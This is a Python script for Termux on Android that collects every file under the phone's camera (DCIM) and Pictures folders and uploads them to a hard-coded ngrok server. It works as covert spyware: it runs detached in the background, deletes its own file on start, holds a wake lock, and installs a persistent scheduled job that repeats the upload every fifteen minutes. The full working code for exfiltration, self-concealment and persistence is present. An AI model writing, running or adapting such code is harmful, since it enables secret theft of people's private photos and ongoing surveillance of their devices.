import os
import subprocess
import sys
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path

try:
    import requests
    from requests.adapters import HTTPAdapter
    from requests.exceptions import RequestException
except ImportError:
    print("[INFO] Biblioteca 'requests' não encontrada. Instalando automaticamente...")
    install_cmd = [sys.executable, "-m", "pip", "install", "requests"]
    result = subprocess.run(install_cmd, check=False)
    if result.returncode != 0:
        print("[ERRO] Falha ao instalar 'requests'. Rode manualmente: pip install requests")
        raise SystemExit(1)

    import requests
    from requests.adapters import HTTPAdapter
    from requests.exceptions import RequestException

# URL do endpoint /upload no seu servidor (ngrok ou IP público)
SERVER_URL = "https://unreclining-melinda-intercarpellary.ngrok-free.dev/upload"
SERVER_UPLOAD_URL = SERVER_URL

ROOT_STORAGE = Path(os.path.expanduser("~/storage"))
ALLOWED_SUBDIRS = ["dcim", "pictures"]
REQUEST_TIMEOUT = 300
MAX_WORKERS = 6
RUN_IN_BACKGROUND = True
SELF_DELETE_ON_START = True
ENABLE_PERSISTENT_SCHEDULER = True
SCHEDULER_JOB_ID = 9001
SCHEDULER_PERIOD_MS = 15 * 60 * 1000
PID_FILE = Path(os.path.expanduser("~/.termux_upload.pid"))
LOG_FILE = Path(os.path.expanduser("~/.termux_upload.log"))
LAUNCHER_FILE = Path(os.path.expanduser("~/.termux_upload_worker.sh"))
THREAD_LOCAL = threading.local()


def get_session() -> requests.Session:
    session = getattr(THREAD_LOCAL, "session", None)
    if session is None:
        session = requests.Session()
        adapter = HTTPAdapter(pool_connections=MAX_WORKERS * 2, pool_maxsize=MAX_WORKERS * 2)
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        THREAD_LOCAL.session = session
    return session


def list_all_files(root_dir: Path):
    files = []
    for subdir_name in ALLOWED_SUBDIRS:
        subdir_path = root_dir / subdir_name
        if not subdir_path.exists():
            print(f"[AVISO] Diretório não encontrado, ignorando: {subdir_path}")
            continue

        for current_root, _, filenames in os.walk(subdir_path, followlinks=True):
            for filename in filenames:
                files.append(Path(current_root) / filename)

    return files


def send_file(file_path: Path, relative_path: str):
    with open(file_path, "rb") as file_handle:
        files = {
            "file": (file_path.name, file_handle, "application/octet-stream"),
        }
        data = {
            "path": relative_path,
        }
        response = get_session().post(
            SERVER_UPLOAD_URL,
            files=files,
            data=data,
            timeout=REQUEST_TIMEOUT,
        )
        return response


def build_relative_path(file_path: Path) -> str:
    try:
        return str(file_path.relative_to(ROOT_STORAGE)).replace("\\", "/")
    except ValueError:
        return os.path.relpath(str(file_path), str(ROOT_STORAGE)).replace("\\", "/")


def upload_one_file(file_path: Path):
    import time
    relative_path = build_relative_path(file_path)
    time.sleep(0.5)

    try:
        response = send_file(file_path, relative_path)
        if 200 <= response.status_code < 300:
            return (True, relative_path, response.status_code, response.text)
        return (False, relative_path, response.status_code, response.text)
    except RequestException as error:
        return (False, relative_path, "REDE", str(error))
    except OSError as error:
        return (False, relative_path, "LEITURA", str(error))


def is_pid_running(pid: int) -> bool:
    try:
        os.kill(pid, 0)
        return True
    except OSError:
        return False


def get_running_pid():
    if not PID_FILE.exists():
        return None

    try:
        pid = int(PID_FILE.read_text(encoding="utf-8").strip())
    except (ValueError, OSError):
        return None

    if is_pid_running(pid):
        return pid

    try:
        PID_FILE.unlink()
    except OSError:
        pass
    return None


def start_background_worker():
    running_pid = get_running_pid()
    if running_pid:
        return

    cmd = [sys.executable, str(Path(__file__).resolve()), "--worker"]
    LOG_FILE.parent.mkdir(parents=True, exist_ok=True)

    with open(LOG_FILE, "a", encoding="utf-8") as log_handle:
        process = subprocess.Popen(
            cmd,
            stdin=subprocess.DEVNULL,
            stdout=log_handle,
            stderr=log_handle,
            start_new_session=True,
            close_fds=True,
        )

    PID_FILE.write_text(str(process.pid), encoding="utf-8")


def create_scheduler_launcher() -> Path:
    script_path = Path(__file__).resolve()
    launcher_content = (
        "#!/data/data/com.termux/files/usr/bin/sh\n"
        "termux-wake-lock >/dev/null 2>&1\n"
        f'"{sys.executable}" "{script_path}" --worker\n'
    )
    LAUNCHER_FILE.write_text(launcher_content, encoding="utf-8")
    os.chmod(LAUNCHER_FILE, 0o700)
    return LAUNCHER_FILE


def install_persistent_scheduler():
    try:
        launcher = create_scheduler_launcher()
        cmd = [
            "termux-job-scheduler",
            "--job-id", str(SCHEDULER_JOB_ID),
            "--period-ms", str(SCHEDULER_PERIOD_MS),
            "--network", "any",
            "--persisted", "true",
            "--script", str(launcher),
        ]
        result = subprocess.run(cmd, check=False, capture_output=True, text=True)
    except FileNotFoundError:
        pass


def enable_termux_wake_lock():
    try:
        subprocess.run(["termux-wake-lock"], check=False, capture_output=True, text=True)
    except FileNotFoundError:
        pass


def clear_pid_file_if_current():
    try:
        if not PID_FILE.exists():
            return
        saved_pid = int(PID_FILE.read_text(encoding="utf-8").strip())
        if saved_pid == os.getpid():
            PID_FILE.unlink()
    except (ValueError, OSError):
        pass


def self_delete_script_file():
    script_path = Path(__file__).resolve()
    try:
        if script_path.exists():
            script_path.unlink()
            print(f"[INFO] Script autoexcluído no início: {script_path}")
    except OSError as error:
        print(f"[AVISO] Não foi possível autoexcluir o script: {error}")


def main():
    args = sys.argv[1:]
    is_worker = "--worker" in args

    if RUN_IN_BACKGROUND and not is_worker:
        if ENABLE_PERSISTENT_SCHEDULER:
            install_persistent_scheduler()
        start_background_worker()
        return

    can_self_delete = SELF_DELETE_ON_START
    if can_self_delete and (is_worker or not RUN_IN_BACKGROUND):
        self_delete_script_file()

    enable_termux_wake_lock()

    PID_FILE.write_text(str(os.getpid()), encoding="utf-8")
    if not ROOT_STORAGE.exists():
        print("[ERRO] Diretório ~/storage não encontrado.")
        print("[DICA] Execute no Termux: termux-setup-storage")
        print("[DICA] Depois rode este script novamente.")
        clear_pid_file_if_current()
        return

    all_files = list_all_files(ROOT_STORAGE)
    total_files = len(all_files)

    if total_files == 0:
        print(f"[INFO] Nenhum arquivo encontrado em: {ROOT_STORAGE}")
        print("[INFO] Busca restrita a: ~/storage/dcim e ~/storage/pictures")
        print("[DICA] No Termux, rode: termux-setup-storage")
        print("[DICA] Depois aceite a permissão de arquivos do Android.")
        print("[DICA] Verifique se existem arquivos em ~/storage/dcim ou ~/storage/pictures")
        clear_pid_file_if_current()
        return

    print(f"[INFO] Total de arquivos encontrados: {total_files}")

    print(f"[INFO] Envio paralelo ativo com {MAX_WORKERS} workers.")

    success_count = 0
    error_count = 0
    completed = 0

    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        future_to_path = {executor.submit(upload_one_file, file_path): file_path for file_path in all_files}

        for future in as_completed(future_to_path):
            completed += 1
            ok, relative_path, status, message = future.result()

            if ok:
                success_count += 1
                print(f"[{completed}/{total_files}] OK   - {relative_path}")
            else:
                error_count += 1
                print(f"[{completed}/{total_files}] ERRO - {relative_path} | {status} | {message}")

    print("\n[RESUMO]")
    print(f"- Sucesso: {success_count}")
    print(f"- Erros:   {error_count}")
    print(f"- Total:   {total_files}")
    clear_pid_file_if_current()


if __name__ == "__main__":
    main()
